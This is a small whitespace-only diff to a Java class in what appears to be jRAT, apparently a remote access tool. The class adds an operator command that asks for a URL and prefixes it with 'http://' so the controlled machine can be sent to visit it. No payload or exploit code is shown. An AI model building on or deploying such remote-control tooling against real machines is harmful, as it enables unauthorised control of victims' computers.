@@ -7,8 +7,6 @@ import pro.jrat.packets.outgoing.Packet14VisitURL;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
 
-
-
 public class OpenWebsiteEvent extends Event {
 
 	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
@@ -36,11 +34,11 @@ public class OpenWebsiteEvent extends Event {
 	@Override
 	public boolean add() {
 		String result = Utils.showDialog("Visit URL", "Input URL to visit");
-		
+
 		if (result != null && !result.startsWith("http://")) {
 			result = "http://" + result;
 		}
-		
+
 		if (result == null) {
 			return false;
 		}
